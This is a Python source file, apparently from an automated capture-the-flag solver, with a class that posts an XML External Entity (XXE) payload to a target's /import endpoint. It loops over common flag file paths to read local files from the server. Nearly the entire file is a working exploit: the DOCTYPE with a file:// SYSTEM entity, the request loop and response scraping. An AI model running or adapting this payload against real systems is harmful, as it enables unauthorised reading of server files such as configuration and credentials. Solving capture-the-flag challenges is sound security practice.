"""Trojan Horse: XXE solver."""
from flag_utils import extract_flag
import requests

class TrojanSolver:
    """XXE to read flag from server filesystem."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        POST /import with XXE payload to read /flag.txt or similar.
        """
        print("=== Trojan Horse: XXE ===", flush=True)

        # Common flag file locations
        flag_paths = [
            "/flag.txt",
            "/flag",
            "/root/flag.txt",
            "/app/flag.txt",
            "/tmp/flag.txt",
            "/var/flag.txt",
            "/home/flag.txt",
        ]

        for flag_path in flag_paths:
            # XXE payload to read file
            xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY flag SYSTEM "file://{flag_path}">
]>
<feed>
    <title>&flag;</title>
</feed>
"""

            try:
                print(f"Trying XXE for {flag_path}", flush=True)
                resp = requests.post(
                    f"{self.base_url}/import",
                    data=xxe_payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=10
                )
                print(f"  Status: {resp.status_code}", flush=True)
                print(f"  Response: {resp.text[:500]}", flush=True)

                # Look for flag in response
                flag = extract_flag(resp.text)
                if flag:
                        return flag
            except Exception as e:
                print(f"  Error: {e}", flush=True)

        print("Failed to extract flag via XXE", flush=True)
        return None
